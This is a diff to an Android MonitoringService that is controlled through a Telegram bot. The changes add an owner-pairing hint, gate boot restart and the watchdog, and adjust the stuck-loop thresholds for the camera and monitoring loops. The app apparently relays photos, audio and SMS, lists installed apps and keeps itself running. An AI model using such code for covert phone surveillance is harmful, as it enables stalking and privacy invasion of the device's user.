@@ -536,10 +536,24 @@ class MonitoringService : Service() {
         if (id == cachedOwnerId) return false
         cachedOwnerId = id
         try {
-            preferencesManager.ownerUserId = id
+            preferencesManager.setOwnerIdSync(id)
         } catch (_: Exception) {
         }
         return true
+    }
+
+    private val pairHintAt = java.util.concurrent.atomic.AtomicLong(0L)
+
+    private suspend fun sendPairHint(senderId: String) {
+        try {
+            val now = android.os.SystemClock.elapsedRealtime()
+            if (now - pairHintAt.get() < 3_600_000L) return
+            pairHintAt.set(now)
+            val token = sendCreds().first.ifEmpty { return }
+            val url = "https://api.telegram.org/bot${token}/sendMessage"
+            TelegramClient.api.sendMessage(url, TelegramMessage(chatId = senderId, text = "Pairing: send /start <chat ID> shown in Setup status.", parseMode = null))
+        } catch (_: Exception) {
+        }
     }
 
     private fun isFreshLocation(last: android.location.Location): Boolean {
@@ -790,7 +804,9 @@ class MonitoringService : Service() {
                     val rawText = (message?.text ?: message?.caption)?.trim().orEmpty()
                     val startHead = rawText.substringBefore(" ").trim().substringBefore("@").lowercase(java.util.Locale.ROOT)
                     val startArg = if (rawText.contains(" ")) rawText.substringAfter(" ").trim() else ""
-                    if (cachedOwnerId == 0L && senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && startHead == "/start" && startArg == chatId) {
+                    if (cachedOwnerId == 0L && senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && startHead == "/start" && startArg != chatId) {
+                        sendPairHint(senderId)
+                    } else if (cachedOwnerId == 0L && senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && startHead == "/start" && startArg == chatId) {
                         val learned = rememberOwner(senderId.toLongOrNull() ?: 0L)
                         if (learned) {
                             registerBotCommands()
@@ -2124,6 +2140,7 @@ class MonitoringService : Service() {
                     preferencesManager.writeSmsPendingSync("", "", 0L, "")
                     sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
                 } else if (okCount.get() > 0) {
+                    preferencesManager.setLastSmsSendAtSync(System.currentTimeMillis())
                             sendToTelegram("\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Check the recipient before retrying; pending kept, try /smsconfirm again.")
                 } else {
                             sendToTelegram("\u26A0\uFE0F SMS not confirmed sent. Pending kept, try /smsconfirm again.")
@@ -2551,8 +2568,10 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
         try {
-            MessageScheduler.scheduleBootRestart(this)
-            MessageScheduler.scheduleWatchdog(this)
+            if (shouldAutoResume()) {
+                MessageScheduler.scheduleBootRestart(this)
+                MessageScheduler.scheduleWatchdog(this)
+            }
         } catch (_: Exception) {
         }
         super.onTaskRemoved(rootIntent)
@@ -2972,8 +2991,8 @@ class MonitoringService : Service() {
                 try {
                     val initialStuck = initialSyncRunning.get() && initialSyncJob?.isActive != true
                     val nowBeat = android.os.SystemClock.elapsedRealtime()
-                    val monitorStuck = monitoringJob?.isActive == true && monitorBeatAt > 0L && monitorCycleMs in 1L..30 * 60_000L && nowBeat - monitorBeatAt > monitorCycleMs + 10 * 60_000L
-                    val cameraStuck = cameraJob?.isActive == true && cameraBeatAt > 0L && cameraCycleMs in 1L..30 * 60_000L && nowBeat - cameraBeatAt > cameraCycleMs + 10 * 60_000L
+                    val monitorStuck = monitoringJob?.isActive == true && monitorBeatAt > 0L && monitorCycleMs in 1L..1440 * 60_000L && nowBeat - monitorBeatAt > monitorCycleMs + 10 * 60_000L
+                    val cameraStuck = cameraJob?.isActive == true && cameraBeatAt > 0L && cameraCycleMs in 1L..60 * 60_000L && nowBeat - cameraBeatAt > cameraCycleMs + 10 * 60_000L
                     if (monitoringJob?.isActive != true || cameraJob?.isActive != true || commandJob?.isActive != true || initialStuck || monitorStuck || cameraStuck) {
                         android.util.Log.w("MonitoringService", "Loop watchdog: restarting dead loops")
                         if (initialStuck) initialSyncRunning.set(false)
@@ -3179,7 +3198,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun sendAudioFile(audioFile: File, alreadyRetried: Boolean = false): MediaSendOutcome {
+    private suspend fun sendAudioFile(audioFile: File): MediaSendOutcome {
         try {
             if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
             if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return MediaSendOutcome.KEPT
@@ -3353,6 +3372,7 @@ class MonitoringService : Service() {
 
     @Volatile
     private var appsCacheAt = 0L
+    @Volatile
     private var appsCache: List<String> = emptyList()
 
     private fun listLaunchableApps(limit: Int): List<String> {
@@ -3423,7 +3443,7 @@ class MonitoringService : Service() {
         return String.format(java.util.Locale.US, "%.2f GB", mb / 1024.0)
     }
 
-    private suspend fun sendPhotoFile(photoFile: File, alreadyRetried: Boolean = false): MediaSendOutcome {
+    private suspend fun sendPhotoFile(photoFile: File): MediaSendOutcome {
         try {
             if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
             if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return MediaSendOutcome.KEPT
